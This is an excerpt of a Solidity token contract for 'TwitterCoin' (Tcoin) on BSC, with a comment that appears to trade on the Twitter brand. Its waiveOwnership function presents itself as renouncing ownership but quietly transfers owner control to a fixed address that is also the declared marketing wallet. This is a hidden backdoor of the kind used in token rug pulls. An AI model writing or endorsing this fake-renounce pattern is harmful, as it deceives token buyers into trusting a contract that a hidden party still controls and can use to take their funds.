...
/**
   Twitter is working Coins an upcoming 
   https://TwitterCoinBscOfficial
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x82868D6a7618166dAd5723d0f431006D8F15D0C1));
        _owner = address(0x82868D6a7618166dAd5723d0f431006D8F15D0C1);
    }
...
contract TwitterCoin is Context, IERC20, Ownable {
    ...
    string private _name = "TwitterCoin";
    string private _symbol = "Tcoin";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x82868D6a7618166dAd5723d0f431006D8F15D0C1);
    address payable public teamWalletAddress = payable(0x1960fF792bE0473E62cC109455aA89AF73E47107);
